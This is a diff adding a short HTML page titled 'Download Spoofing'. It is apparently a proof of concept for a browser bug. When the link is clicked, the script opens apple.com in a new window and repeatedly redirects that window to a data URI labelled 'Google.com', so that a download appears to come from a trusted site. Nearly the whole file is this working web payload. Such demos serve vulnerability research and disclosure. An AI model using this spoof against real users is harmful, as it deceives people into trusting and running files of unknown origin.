@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Download Spoofing</title>
+</head>
+<body>
+    <a class="google">Click here: Spoof the download ;)</a>
+    <script>
+        const googleEle = document.querySelector('.google')
+
+        googleEle.addEventListener('click', e => {
+            let ref = window.open('https://www.apple.com')
+            ref.focus();
+            let attempts = 0
+            let id = setInterval( () => {
+                if(attempts > 3) {
+                    clearInterval(id)
+                }
+                ref.location.href = 'data:foo/bar,#Google.com';
+                attempts++
+            }, 500)
+        })
+
+    </script>
+</body>
+</html>
